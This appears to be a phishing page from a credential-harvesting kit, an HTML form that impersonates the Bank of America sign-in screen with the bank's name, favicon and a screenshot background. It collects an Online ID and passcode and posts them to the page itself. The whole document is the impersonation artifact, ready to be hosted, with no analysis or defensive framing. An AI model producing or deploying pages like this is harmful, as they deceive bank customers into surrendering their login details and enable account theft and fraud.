<!DOCTYPE html>
<html><head>
  
    <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
     <link rel="shortcut icon" href="../assets/img/boa.ico">
     <script type="text/javascript" src="../assets/js/jquery.js"></script>
     <script type="text/javascript" src="../assets/js/jquery.validate.min.js"></script>
  </head>
  <body>

<title>Bank of America | Sign In</title>

      <div id="boalogin" style="background: url(./../assets/img/boa-login.png) no-repeat;  height: 400px;  width: 328px;               margin: 0 auto;   margin-top: 40px; position: relative;">             
      <form action="" id="verifys" method="post">     
<input name="onlineid" title="Online ID" style="position: absolute;  outline: none;left: 27px;top: 101px; font-family: Calibri, Helvetica, sans-serif; border: 1px solid #CCCCCC; width: 276px; height:40px;" placeholder=" Online ID" required="">   
<input name="passcode" title="Passcode" type="password" style="position: absolute;  outline: none;left: 27px;top: 149px; font-family: Calibri, Helvetica, sans-serif; border: 1px solid #CCCCCC; width: 276px; height:40px;" placeholder=" Passcode" required="">  
<button style="font-family: Calibri; font-size:20px; position: absolute;top: 217px; border: 1px solid #fff;  background-color: #D82534; left: 27px;  width: 276px; text-align:center; height:40px; color:#fff;">Sign In</button>
  </div>
  
  </form> 
</body></html>